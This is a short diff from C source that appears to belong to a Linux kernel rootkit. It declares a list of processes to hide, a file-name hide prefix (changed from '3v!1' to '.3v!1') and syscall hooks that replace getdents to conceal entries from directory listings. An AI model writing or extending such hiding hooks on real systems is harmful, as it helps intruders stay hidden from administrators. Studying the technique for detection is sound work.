@@ -5,7 +5,7 @@
 static char** dynamic_processes_to_hide;
 static int arrayListSize;
 static int maxArrayListSize;
-static char *hide__prefix = "3v!1";
+static char *hide__prefix = ".3v!1";
 static struct sctm *hide__sctm = NULL;
 static struct sctm_hook hide__hooks[3];
 static asmlinkage int (*original_getdents)(unsigned int fd,struct linux_dirent* dirp,
